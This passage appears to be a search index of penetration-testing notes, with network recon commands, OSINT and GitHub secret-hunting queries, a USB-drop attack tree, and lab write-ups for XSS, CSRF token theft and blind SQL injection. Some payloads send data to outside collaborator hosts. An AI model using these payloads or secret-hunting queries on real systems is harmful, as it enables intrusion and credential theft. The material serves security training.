Exceeded message. Most do not (RFC 792) UDP traceroute is not so great where filtering is in place. Most Unix traceroute implementations now support TCP static port traceroutes out of the box. Mapping out DMZ and internal networks  Because all traceroutes work using ICMP TTL Exceeded messages, which protocol is used is not important as long as there is a known response. Use a TCP traceroute with a SYN flag set, and commonly open ports such as 25, 80 or 443 for which you can get a reliable response back once the target is reached. Uptime  Each time a server is patched or updated, it must also be rebooted. If a server has been up for a long time, we know it has not been patched or updated in that time, and that it will be vulnerable to all vulnerabilities discovered during that timeframe. Examples  Traceroute in nmap with Geo resolving: nmap --traceroute --script traceroute-geolocation.nse -p 80 [ip_or_hostname] The default packet which hping3 will create is a TCP packet: # hping3 -T -V --tr-stop -S -p 80 [ip_or_hostname] Specify the source and destination ports of the packet to help it bypass the firewall. Send three packets out ( -c ) to destination port 53 ( -p ) and set the SYN flag in the packet, so it looks like the first phase of the three-way handshake ( -S ): hping3 -c 3 -p 53 -S [ip_or_hostname] Traceroute in hping3 using a TCP scan to a specific destination port: # hping3 --traceroute --verbose --syn --destport [80] [ip_or_hostname] Discover the IP addresses of servers behind a DNS: # hping3 [big site hostname] -S -p 80 -T –ttl 13 –tr-keep-ttl -n Uptime of a server: # hping3 [ip_or_hostname] -p 80 –tcp-timestamp -S -c 4",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "77bef2e609a2bbb9d38d4b3ba1cf60fb",
    "u": "https://recon.tymyrddin.dev/docs/app/sneaky",
    "t": "Other sneaky OSINT techniques ",
    "c": "Other sneaky OSINT techniques  Engineering job listings often reveal the technologies the company uses. If you can’t find relevant job posts, search for employees’ profiles on LinkedIn, and read employees’ personal blogs or their engineering questions on forums like Stack Overflow and Quora. People’s work calendars often contain meeting notes, slides, and sometimes even login credentials. If an employee shares their calendars with the public by accident, you could gain access to these. The organisation or its employees’ social media pages might also leak valuable information. Like a sets of valid credentials on Post-it Notes visible in the background of office selfies??? If the company has an engineering mailing list, sign up for it to gain insight into the company’s technology and development process. Check for SlideShare or Pastebin accounts. Consult archive websites like the Wayback Machine . Tomnomnom’s tool Waybackurls can automatically extract endpoints and URLs from the Wayback Machine.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "563d3df639de5cc87ce98241d343a8a5",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gathering information about a target system that can be used to execute a successful attack. To get this information, use various methods with variant tools. Why?  Analyse the security posture of the target and find loopholes for creating an attack plan. Using different tools and techniques, narrow down the range of IP addresses. Use the collected information to identify weaknesses in the target’s security. Graphically represent the target’s network, so it can be used as a guide during the attack. How?  Gather network information Gather system information Collect organisation information",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "07424d82724b1a48d202f4f49f538fd1",
    "u": "https://recon.tymyrddin.dev/docs/api/functionality",
    "t": "Understand application functionality ",
    "c": "Understand application functionality  Enumerate the endpoints and identify the parameters that can be used to call the API. Use a tool like Postman to send requests to the API and see the response. Review the API documentation. This will help understand the functionality of the API and identify the attack surface. Resources  Using SOAP requests",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17d2dcae1d0a060e2a5976096aaad82d",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/organisation",
    "t": "Collect organisation information ",
    "c": "Collect organisation information  Employee information Organisation’s background Phone numbers Locations Advanced searches  Search engines can be used to gather information about the target organisation. Search results can include , and other information that could be useful. Search engines crawl the world wide web day and night to index new web pages and files. Sometimes this can lead to indexing confidential information: Information about employees Intranet information Login pages Documents for internal company use Confidential spreadsheets with usernames, email addresses, and even passwords Files containing usernames Sensitive directories Service version number (some of which might be vulnerable and unpatched) Error messages Google dorking  Google dorking is a technique which involves using a set of search operators and building complex queries. The operators that are used in Google hacking are called dorks. Email footprinting  Email footprinting involves collecting information from emails by monitoring the email delivery and inspecting the headers: IP address of the recipient Geolocation of the recipient Delivery information Visited links Browser and OS information Reading time Email headers contain information about the sender, subject, and recipient. All this information is valuable to hackers when planning to attack their target. Information contained in email headers include: Sender’s name IP/Email address of the sender Mail server Mail server authentication system Send and delivery stamp Unique number of the message Email tracking tools have the capability of tracking emails and inspecting their headers to extract useful information. The sender is notified of the email being delivered and opened by the recipient. Assets discovery  Assets discovery involves collecting all the company names owned by a main company and then all the assets of these companies: Find the acquisitions of the main company, this will give the companies inside the scope. Find the ASN (if any) of each company, this will give the IP ranges owned by each company. Use reverse whois lookups to search for other entries (organisation names, domains…) related to the first one (recursively). Shodan and SSL filters can be used to search for other assets (the SSL trick can be done recursively). Investigating social media  The private world of yesterday is now an online world. Everyone with a search engine has open access to social networks, government databases, and public records. Social media websites have become very popular for not only personal use but also for corporate use. Some social media platforms can reveal tons of information about the target. This is especially true as many users tend to overshare details about themselves and their work. To name but a few, it’s worthwhile checking the following: LinkedIn Twitter Facebook Instagram Google groups Social media scraping can automate discovering names, email addresses, phone numbers, biographies. Visit job listing sites  Job advertisements can also tell a lot about an organisation. In addition to revealing names and email addresses, job posts for technical positions could give insight into the target’s systems and infrastructure. The popular job posts might vary from one country to another. Make sure to check job listing sites in the countries where the target would post their ads. And it is always worth checking their website for any job opening and seeing if this can leak any interesting information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "106e87e4f24df095e7d4f2ad32baaf0a",
    "u": "https://recon.tymyrddin.dev/docs/scanning/defence",
    "t": "Defence detection ",
    "c": "Defence detection  Check to see if a target is using a load balancing solution with the lbd (load balancing detector) command. To determine if the target is behind a web application firewall (WAF), use the wafw00f command. It may be needed to encode some attack tools to try to trick antivirus software into not seeing the code as being harmful. To detect what ports a firewall is forwarding on to a target, use the firewalk command. Is also available for nmap as firewalk.nse script.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aba9d1f5df203926b310557f55850f83",
    "u": "https://recon.tymyrddin.dev/docs/scanning/war-dialing-driving-flying-shipping",
    "t": "War-dialing-driving-flying-shipping ",
    "c": "War-dialing-driving-flying-shipping  Discover wireless networks. War dialing  Large organisations usually have their phone numbers assigned in blocks from a local telephone company, and many have their own dialing prefix. This information was used in war dialing all the company phone numbers looking for a dial-up server. Once such a server was found, it was used for guessing account usernames. War driving  War-driving, sitting in a parking lot or in a building across the street with a laptop and a wireless NIC, looking for unsecured or poorly secured access points. War-driving has been made easy by programs such as Network Stumbler and Wellenreiter, which use consumer WiFi cards to automatically scan the airwaves for networks. These wardriving programs and databases are often correlated with global positioning system (GPS) data so that physical maps of these networks can be made. War strolling  War-strolling, simply walking around with wireless equipment looking for networks. War flying  War-flying, mounting antennas on a drone and flying it around as a variation on war-driving. War shipping  War-shipping, shipping someone a device that does wireless scans. It uses disposable, low-cost and low-power 3G-enabled single-board computers that are easy to build for under 100 euro, the proliferation of e-commerce deliveries and a command-and-control (C&C) server to remotely perform close-proximity attacks, regardless of the location of an adversary. It increases target accuracy dramatically. Hide a tiny device in a package and ship it off to the target to gain access to their network. Low build-cost means several can be shipped. The device can be tucked into the bottom of a packaging box or stuffed in a toy. While in transit, the device can do periodic basic wireless scans, similar to what a laptop does in war-driving when looking for Wi-Fi hotspots, and send its location coordinates via GPS back to the C&C server. Once having arrived it can be used for further attacks to gain a persistent foothold in the network. These attacks have their limitations. These include the amount of time it takes to perform the attack and the suspicions that arise when a car is detected circling a block hundreds of times with an auspicious antenna up top and a laptop in view, a drone circling around, and someone that seemingly aimlessly keeps wandering about. Resources  Stumbler is a tool for Windows that facilitates detection of Wireless LANs using the 802.11b, 802.11a and 802.11g WLAN standards. It runs on Microsoft Windows operating systems from Windows 2000 to Windows XP. A trimmed-down version called MiniStumbler is available for the handheld Windows CE operating system. The program is commonly used for wardriving, verifying network configurations, finding locations with poor coverage in a WLAN, detecting causes of wireless interference, detecting unauthorized (“rogue”) access points and aiming directional antennas for long-haul WLAN links. Wellenreiter is a wireless network discovery and auditing tool that supports Prism2, Lucent, and Cisco based cards. It is an easy to use Linux scanning tool. No card configuration has to be done and it is quite self-explanatory. It can discover networks (BSS/IBSS), and detects ESSID broadcasting or non-broadcasting networks and their WEP capabilities and the manufacturer automatically. DHCP and ARP traffic are decoded and displayed to give further information about the networks. An ethereal/tcpdump-compatible dumpfile and an Application savefile will be automatically created. Using a supported GPS device and the gpsd the location of the discovered networks can be tracked.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c207b124e1029a5ec3c5e3be2aa1f2e0",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/system",
    "t": "Gather system information ",
    "c": "Gather system information  Web server operating systems Server locations Users Passwords Website footprinting  Website footprinting is a technique in which information about the target is collected by monitoring the target’s website. Hackers can map the entire website of the target without being noticed. Website footprinting gives information about: Software Operating system Subdirectories  information Scripting platform Query details By examining the website headers, it is possible to obtain information about the following headers: Content-Type Accept-Ranges Connection Status Last-Modified Information X-powered-by Information Web Server Information Additional ways to gather information is through HTML Source Code and cookie examination. By examining the HTML source code, it is possible to extract information from the comments in the code, as well as gain insight into the file system structure by observing the links and image tags. Cookies can also reveal important information about the software that is running on the server and its behaviour. And by inspecting sessions, it is possible to identify the scripting platforms. Web spiders methodically browse a website in search of specific information. Information collected can be helpful in planning social engineering attacks. Cloning websites  Website mirroring or website cloning refers to the process of duplicating a website. Mirroring a website helps in browsing the site offline, searching the website for vulnerabilities, and discovering useful information. Websites may store documents of different format, which in turn may contain hidden information and metadata that can be analyzed and used in (planning) an attack. This metadata can be extracted with metadata extraction tools. Eyeing repositories  Look for hardcoded secrets: SQL passwords AWS access keys Google Cloud private keys API tokens Test accounts In GitHub search: # Sample of GitHub queries org:TargetName password org:TargetName aws_secret_access_key org:TargetName aws_key org:TargetName BEGIN RSA PRIVATE KEY org:TargetName BEGIN OPENSSH PRIVATE KEY org:TargetName secret_key org:TargetName hooks.slack.com/services org:TargetName sshpass -p org:TargetName sq0csp org:TargetName apps.googleusercontent.com org:TargetName extension:pem key Sensitive files discovery  Many tools for finding the URLs of sensitive files exist. One such tool is dirb , a web content discovery tool.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1f6f6c989547d2a9478e6ed79e0d142c",
    "u": "https://physical.tymyrddin.dev/docs/opsec/usb",
    "t": "USB key drop ",
    "c": "USB key drop  Attack tree  1 Configure a script or application to automatically run when a USB drive is connected (AND) 1.1 Collect information, for example IP address, of the system the drive is connected to (AND) 1.2 Send the information to an 1.2.1 Email address (OR) 1.2.2 C2 2 Leave configured USB flash drives all over the organisation for someone to pick it up and plug it in Notes  With USB key drop, you can find out the security awareness level of the organisation. If you leave ten USB drives, and you get eight email messages, it is clear to people they should not connect untrusted devices to their computers. Tools  USB Rubber Ducky Bash Bunny",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fba3273d40d8add294998fdf069e7daf",
    "u": "https://webapp.tymyrddin.dev/",
    "t": "A canopy of apple-blossom ",
    "c": "A canopy of apple-blossom  TL/DR: Many web applications can still easily be exploited to gain unauthorised access to sensitive data and webservers. Notes on techniques based on, and writeups of, Portswigger Labs, Root-me challenges and TryHackMe CTFs. Testlab Web application pentesting tools Preparation Reconnaissance Enumeration Notes on techniques Introduction Cross-site scripting (XSS) Open redirection Clickjacking Cross-site request forgery (CSRF) Insecure direct object references (IDOR) SQL injection Race conditions Server-side request forgery (SSRF) Insecure deserialisation XML external entity (XXE) injection Web cache poisoning HTTP Request smuggling Template injection (SSTI) Directory traversal Authentication vulnerabilities Single-sign-on security (SSO) Broken access control Application logic errors HTTP Host header attacks Websocket vulnerabilities Remote code execution (RCE) Same-origin policy (SOP) Information disclosure File uploads JSON web tokens attacks Prototype pollution TryHackMe rooms Introduction Picklerick Root-me challenges  Web client Introduction HTML disabled buttons Javascript authentication Javascript source Javascript native code XSS stored 1 CSP bypass inline CSRF: zero protection Web server Introduction Insecure code management Directory traversal File upload: null byte PHP assert() PHP Filters PHP Register globals JWT Introduction JWT (not) revoked token JWT weak secret Python: Server-side Template Injection Introduction Command injection: filter bypass Java: Server-side Template Injection (SSTI) Local file inclusion Local file inclusion: double encoding PHP preg_replace PHP type juggling SQL injection: authentication SQL injection: string XSLT code execution PHP path truncation PHP serialisation SQL injection: numeric SQL injection: routed SQL truncation XPath injection: authentication SQL injection: time-based Portswigger Web Security Academy labs  XSS Introduction Reflected XSS into HTML context with nothing encoded Stored XSS into HTML context with nothing encoded DOM XSS in document.write sink using source location.search DOM XSS in innerHTML sink using source location.search DOM XSS in jQuery anchor href attribute sink using location.search source DOM XSS in jQuery selector sink using a hashchange event Reflected XSS into attribute with angle brackets HTML-encoded Stored XSS into anchor href attribute with double quotes HTML-encoded Reflected XSS into a JavaScript string with angle brackets HTML encoded DOM XSS in document.write sink using source location.search inside a select element DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded Reflected DOM XSS Stored DOM XSS Exploiting cross-site scripting to steal cookies Exploiting cross-site scripting to capture passwords Exploiting XSS to perform CSRF Reflected XSS into HTML context with most tags and attributes blocked Reflected XSS into HTML context with all tags blocked except custom ones Reflected XSS with some SVG markup allowed Reflected XSS in canonical link tag Reflected XSS into a JavaScript string with single quote and backslash escaped Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped Reflected XSS with event handlers and href attributes blocked Reflected XSS in a JavaScript URL with some characters blocked Reflected XSS with AngularJS sandbox escape without strings Reflected XSS with AngularJS sandbox escape and CSP Reflected XSS protected by very strict CSP, with dangling markup attack Reflected XSS protected by CSP, with CSP bypass SQLi Introduction SQL injection vulnerability in WHERE clause allowing retrieval of hidden data SQL injection vulnerability allowing login bypass SQL injection UNION attack, determining the number of columns returned by the query SQL injection UNION attack, finding a column containing text SQL injection UNION attack, retrieving data from other tables SQL injection UNION attack, retrieving multiple values in a single column SQL injection attack, querying the database type and version on Oracle SQL injection attack, querying the database type and version on MySQL and Microsoft SQL injection attack, listing the database contents on non-Oracle databases SQL injection attack, listing the database contents on Oracle Blind SQL injection with conditional responses Blind SQL injection with conditional errors Blind SQL injection with time delays Blind SQL injection with time delays and information retrieval Blind SQL injection with out-of-band interaction Blind SQL injection with out-of-band data exfiltration SQL injection with filter bypass via XML encoding CSRF Introduction CSRF vulnerability with no defenses CSRF where token validation depends on request method CSRF where token validation depends on token being present CSRF where token is not tied to user session CSRF where token is tied to non-session cookie CSRF where token is duplicated in cookie SameSite Lax bypass via method override SameSite Strict bypass via client-side redirect SameSite Strict bypass via sibling domain SameSite Lax bypass via cookie refresh CSRF where Referer validation depends on header being present CSRF with broken Referer validation Clickjacking Introduction Basic clickjacking with CSRF token protection Clickjacking with form input data prefilled from a URL parameter Clickjacking with a frame buster script Exploiting clickjacking vulnerability to trigger DOM-based XSS Multistep clickjacking DOM-based vulns Introduction DOM XSS using web messages DOM XSS using web messages and a JavaScript URL DOM XSS using web messages and JSON.parse DOM-based open redirection DOM-based cookie manipulation Exploiting DOM clobbering to enable XSS Clobbering DOM attributes to bypass HTML filters CORS Introduction CORS vulnerability with basic origin reflection CORS vulnerability with trusted null origin CORS vulnerability with trusted insecure protocols CORS vulnerability with internal network pivot attack XXE Introduction Exploiting XXE using external entities to retrieve files Exploiting XXE to perform SSRF attacks Blind XXE with out-of-band interaction Blind XXE with out-of-band interaction via XML parameter entities Exploiting blind XXE to exfiltrate data using a malicious external DTD Exploiting blind XXE to retrieve data via error messages Exploiting XInclude to retrieve files Exploiting XXE via image file upload Exploiting XXE to retrieve data by repurposing a local DTD SSRF Introduction Basic SSRF against the local server Basic SSRF against another back-end system SSRF with blacklist-based input filter SSRF with filter bypass via open redirection vulnerability Blind SSRF with out-of-band detection SSRF with whitelist-based input filter Blind SSRF with Shellshock exploitation HTTP request smuggling Introduction HTTP request smuggling, basic CL.TE vulnerability HTTP request smuggling, basic TE.CL vulnerability HTTP request smuggling, obfuscating the TE header HTTP request smuggling, confirming a CL.TE vulnerability via differential responses HTTP request smuggling, confirming a TE.CL vulnerability via differential responses Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability Exploiting HTTP request smuggling to reveal front-end request rewriting Exploiting HTTP request smuggling to capture other users’ requests Exploiting HTTP request smuggling to deliver reflected XSS Response queue poisoning via H2.TE request smuggling H2.CL request smuggling HTTP/2 request smuggling via CRLF injection HTTP/2 request splitting via CRLF injection CL.0 request smuggling Exploiting HTTP request smuggling to...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dc9384161ccdb2bfd4ab6ae9c2190652",
    "u": "https://webapp.tymyrddin.dev/docs/business/10",
    "t": "Infinite money logic flaw ",
    "c": "Infinite money logic flaw  Description  This lab has a logic flaw in its purchasing workflow. Reproduction  With Burp running, log in with wiener:peter , and sign up for the newsletter to obtain a coupon code, SIGNUP30 . Notice that you can buy $10 gift cards and redeem them from the My account page. Add a gift card to your basket and proceed to the checkout. Apply the coupon code to get a 30% discount. Complete the order and copy the gift card code to your clipboard. Go to your account page and redeem the gift card. Observe that this entire process has added \\(3 to your store credit. To obtain the `\\) 1234 required to purchase a leather jacket, 412` gift cards need to be redeemed. This process can be automated. Study the proxy history and notice that the gift card is redeemed by supplying the code in the gift-card parameter of the POST /gift-card request. Go to Settings -> Project -> Sessions . In the Session handling rules panel, click Add . The Session handling rule editor dialog opens. In the dialog, go to the Scope tab. Under URL Scope , select Include all URLs . Go back to the Details tab. Under Rule actions , click Add -> Run a macro . Under Select macro , click Add again to open the Macro Recorder. Select the following sequence of requests: POST /cart POST /cart/coupon POST /cart/checkout GET /cart/order-confirmation?order-confirmed=true POST /gift-card Then, click OK . The Macro Editor opens. In the list of requests, select GET /cart/order-confirmation?order-confirmed=true . Click Configure item . In the dialog that opens, click Add to create a custom parameter. Name the parameter gift-card and highlight the gift card code at the bottom of the response. Click OK twice to go back to the Macro Editor. Select the POST /gift-card request and click Configure item again. In the Parameter handling section, use the drop-down menus to specify that the gift-card parameter should be derived from the prior response (response 4). Click OK . In the Macro Editor, click Test macro . Look at the response to GET /cart/order-confirmation?order-confirmation=true and note the gift card code that was generated. Look at the POST /gift-card request. Make sure that the gift-card parameter matches and confirm that it received a 302 response. Keep clicking OK until you get back to the main Burp window. Send the GET /my-account request to Burp Intruder. Use the “Sniper” attack type and clear the default payload positions. On the Payloads tab, select the payload type Null payloads . Under Payload options , choose to generate 412 payloads. Go to the Resource pool tab and add the attack to a resource pool with the Maximum concurrent requests set to 1 . Start the attack. When the attack finishes, you will have enough store credit to buy the jacket and solve the lab. PoC  Exploitability  An attacker will need to log in; abuse the logic flaw to get enough credit; and buy a “Lightweight l33t leather jacket” with it.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "37ce31136d9289481355573a4d4d8ae6",
    "u": "https://webapp.tymyrddin.dev/docs/xss/29",
    "t": "Reflected XSS protected by very strict CSP, with dangling markup attack ",
    "c": "Reflected XSS protected by very strict CSP, with dangling markup attack  Description  The website in this lab is using a strict CSP that blocks outgoing requests to external websites. Reproduction and proof of concept  Log in to the lab using the account provided above. Examine the change email function. Note there is an XSS vulnerability in the email parameter. In Burp, go to the Collaborator tab. Click “Copy to clipboard” to copy a unique Burp Collaborator payload to your clipboard. Back in the lab, go to the exploit server and add the following code, replacing lab-id and exploit-server-id with your lab ID and exploit server ID respectively, and replacing collaborator-id with the payload just copied from Burp Collaborator. <script> if(window.name) { new Image().src='//burp-collab-subdomain?'+encodeURIComponent(window.name); } else { location = 'https://lab-id.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27'; } </script> Click Store and then Deliver exploit to victim . When the user visits the website containing this malicious script, if they click on the “Click me” link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using the Burp Collaborator client. Go back to the Collaborator tab, and click “Poll now”. If you don’t see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user’s CSRF token. gO5FXqB3x1YvlTNGh9o0BXK2TumhZF4H With Burp’s Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address. In Burp, go to the intercepted request and change the value of the email parameter to hacker@evil-user.net : Right-click on the request and, from the context menu, select “Engagement tools” and then “Generate CSRF PoC”. The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier. Click “Options” and make sure that the “Include auto-submit script” is activated. Click “Regenerate” to update the CSRF HTML so that it contains the stolen token, then click “Copy HTML” to save it to your clipboard. Drop the request and switch off the intercept feature. Go back to the exploit server and paste the CSRF HTML into the body. Overwrite the script that entered earlier. Click Store and Deliver exploit to victim . The user’s email will be changed to hacker@evil-user.net . Exploitability  To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4656dacc17bfc658474bc0d2c5d33125",
    "u": "https://webapp.tymyrddin.dev/docs/xss/2",
    "t": "Stored XSS into HTML context with nothing encoded ",
    "c": "Stored XSS into HTML context with nothing encoded  Description  The website in this lab contains a stored cross-site scripting vulnerability in the comment functionality. Reproduction and proof of concept  Enter the following into the comment box: <script>alert('Hello World')</script> Enter a name, email and website. Click Post comment . Go back to the blog.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cfc4d483029dd84366bf8bf2df66a707",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/15",
    "t": "Blind SQL injection with out-of-band interaction ",
    "c": "Blind SQL injection with out-of-band interaction  Description  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The SQL query is executed asynchronously and has no effect on the application’s response. However, you can trigger out-of-band interactions with an external domain. Burp Suite Professional is required to solve this lab! Reproduction and proof of concept  Visit the Home page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, SQL injection can be combined with basic XXE techniques: Right-click and select “Insert Collaborator payload” to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie (Use the cheatsheet to create payloads). TrackingId=3vN9DLaImMIfzJgX' || (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://e0fmgwxdxyfjykzktu8mtaj06rci0bo0.oastify.com/\"> %remote;]>'),'/l') FROM dual)-- URL-encode (CTRL-U): TrackingId=3vN9DLaImMIfzJgX'+||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//e0fmgwxdxyfjykzktu8mtaj06rci0bo0.oastify.com/\">+%25remote%3b]>'),'/l')+FROM+dual)-- Send, and check in the Collaborator tab that the payload had indeed triggered a DNS lookup and potentially exploit this behaviour to exfiltrate sensitive data from the application.: Exploitability  To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server. To solve the lab, it is required to exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. Burp Collaborator is only available in the Enterprise and Professional editions. You can apply for a free 30-day trial here .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "63ecd48dce5eb498fc1dfba9efc61051",
    "u": "https://webapp.tymyrddin.dev/docs/xss/17",
    "t": "Reflected XSS into HTML context with most tags and attributes blocked ",
    "c": "Reflected XSS into HTML context with most tags and attributes blocked  Description  The website in this lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. Use the XSS cheatsheet Reproduction and proof of concept  Inject a standard XSS vector in the search box, and intercept: <img src=1 onerror=print()> It gets blocked. Test which tags and attributes are being blocked: Open Burp’s browser and use the search function in the lab. Send the resulting request to Burp Intruder. In Burp Intruder, in the Positions tab, click “Clear §”. Replace the value of the search term with: <> Place the cursor between the angle brackets and click “Add §” twice, to create a payload position. The value of the search term should now look like: <§§> Go to the XSS cheat sheet and click “Copy tags to clipboard”. In Burp Intruder, in the Payloads tab, click “Paste” to paste the list of tags into the payloads list. Click “Start attack”. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response. Go back to the Positions tab in Burp Intruder and replace the search term with: <body%20=1> Place the cursor before the = character and click “Add §” twice, to create a payload position. The value of the search term should now look like: <body%20§§=1> Visit the XSS cheat sheet again and click “Copy events to clipboard”. In Burp Intruder, in the Payloads tab, click “Clear” to remove the previous payloads. Then click “Paste” to paste the list of attributes into the payloads list. Click “Start attack”. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response. Go to the exploit server and paste the following code, replacing 0aa900f60364bf3ec1f908fa00dc005a with your lab ID: <iframe src=\"https://0aa900f60364bf3ec1f908fa00dc005a.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'> Click Store and Deliver exploit to victim .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "039ff9d68b61f906ba0c5ea8778e1dcb",
    "u": "https://webapp.tymyrddin.dev/docs/id/1",
    "t": "Information disclosure in error messages ",
    "c": "Information disclosure in error messages  Description  This lab ’s verbose error messages reveal that it is using a vulnerable version of a third-party framework. Reproduction and proof of concept  With Burp running, open one of the product pages. In Burp, go to Proxy > HTTP history and notice that the GET request for product pages contains a productID parameter. Send the GET /product?productId=1 request to Burp Repeater. Note that your productId might be different depending on which product page you loaded. In Burp Repeater, change the value of the productId parameter to a non-integer data type, such as a string. Send the request. GET /product?productId=\"example\" The unexpected data type causes an exception, and a full stack trace is displayed in the response. This reveals that the lab is using Apache Struts 2 2.3.31 . Go back to the lab, click “Submit solution”, and enter 2 2.3.31 to solve the lab. Exploitability  An attacker will need to obtain and submit the version number of this framework.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8e5294581d433e8605d94b125478ef91",
    "u": "https://webapp.tymyrddin.dev/docs/business/6",
    "t": "Inconsistent handling of exceptional input ",
    "c": "Inconsistent handling of exceptional input  Description  This lab does not adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. Reproduction  While proxying traffic through Burp, open the lab and go to the Target -> Site map tab. Right-click on the lab domain and select Engagement tools -> Discover content to open the content discovery tool. Click Session is not running to start the content discovery. After a short while, look at the Site map tab in the dialog. Notice that it discovered the path /admin . Try to browse to /admin . Although you don’t have access, an error message indicates that DontWannaCry users do. Go to the account registration page. Notice the message telling DontWannaCry employees to use their company email address. From the button in the lab banner, open the email client. Make a note of the unique ID in the domain name for your email server ( @YOUR-EMAIL-ID.web-security-academy.net ). Go back to the lab and register with an exceptionally long email address in the format: very-long-string@YOUR-EMAIL-ID.web-security-academy.net The very-long-string should be at least 200 characters long. Go to the email client and notice that you have received a confirmation email. Click the link to complete the registration process. Log in and go to the My account page. The email address has been truncated to 255 characters. Log out and go back to the account registration page. Register a new account with another long email address, but this time include dontwannacry.com as a subdomain in the email address: very-long-string@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net Make sure that the very-long-string is the right number of characters so that the “m” at the end of @dontwannacry.com is character 255 exactly. attacker-loggiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiing-iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiin-wiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiith-an-extremely-long-name@dontwannacry.com Go to the email client and click the link in the confirmation email that you have received. Log in to your new account and notice that you now have access to the admin panel. The confirmation email was successfully sent to your email client, but the application server truncated the address associated with your account to 255 characters. As a result, you have been able to register with what appears to be a valid @dontwannacry.com address. You can confirm this from the My account page. Go to the admin panel and delete Carlos to solve the lab. PoC  Exploitability  An attacker will need to access the admin panel and delete Carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2d6f7243d9940746ff70e98ed3bed0a2",
    "u": "https://webapp.tymyrddin.dev/docs/xss/10",
    "t": "DOM XSS in document.write sink using source location.search inside a select element ",
    "c": "DOM XSS in document.write sink using source location.search inside a select element  Description  The website in this lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element. Reproduction and proof of concept  On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality. <form id=\"stockCheckForm\" action=\"/product/stock\" method=\"POST\"> <input required type=\"hidden\" name=\"productId\" value=\"4\"> <script> var stores = [\"London\",\"Paris\",\"Milan\"]; var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('<select name=\"storeId\">'); if(store) { document.write('<option selected>'+store+'</option>'); } for(var i=0;i<stores.length;i++) { if(stores[i] === store) { continue; } document.write('<option>'+stores[i]+'</option>'); } document.write('</select>'); </script> <button type=\"submit\" class=\"button\">Check stock</button> </form> Add a storeId query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL. https://0a07003f04c9eae2c0c9af0b0027005f.web-security-academy.net/product?productId=4&storeId=abcdef In the browser, the random string is now listed as one of the options in the drop-down list. Right-click and inspect the drop-down list to confirm that the value of the storeId parameter has been placed inside a select element. Create a suitable XSS payload 